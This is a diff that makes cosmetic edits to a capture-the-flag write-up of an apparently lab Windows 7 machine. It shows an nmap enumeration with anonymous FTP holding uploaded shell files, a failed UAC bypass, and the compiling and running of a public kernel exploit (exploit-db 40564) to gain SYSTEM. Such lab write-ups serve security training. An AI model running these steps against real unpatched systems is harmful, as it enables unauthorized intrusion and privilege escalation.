@@ -22,14 +22,14 @@ description: >-
 
 ***
 
-### Enumeration
+### 🔍Enumeration
 
 ```bash
 sudo nmap -sC -sV -A -T4 -p- 10.10.10.5
 ```
 
 ```
-yamlCopyEditPORT   STATE SERVICE VERSION
+PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |   Files listed: aspnet_client, iisstart.htm, shelly.asp, shelly.aspx, welcome.png
@@ -98,19 +98,17 @@ Tried UAC bypass:
 Start-Process powershell -Verb runAs "calc.exe"
 ```
 
-No success.
+No success:exclamation:
 
-Eventually, ran `systeminfo` and noticed the system was severely outdated (Windows 7), with no patching.
-
-Compiled and used a known kernel exploit:
+Eventually, ran `systeminfo` and noticed the system was severely outdated (Windows 7), with no patching. Compiled and used a known kernel exploit:
 
 ```bash
-b# Exploit: https://www.exploit-db.com/exploits/40564
+# Exploit: https://www.exploit-db.com/exploits/40564
 i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
 
 # Uploaded and executed
 exploit.exe
 ```
 
-Boom—got SYSTEM access.
+Boom! got SYSTEM access.
 
